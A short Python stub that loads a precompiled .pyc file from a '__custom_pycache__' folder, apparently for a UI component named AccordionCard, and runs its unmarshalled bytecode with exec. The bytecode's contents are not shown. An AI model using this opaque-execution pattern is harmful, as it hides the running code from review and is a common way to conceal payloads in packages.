
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'AccordionCard_67e1720485d7432f98a4b2bdf9826207.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
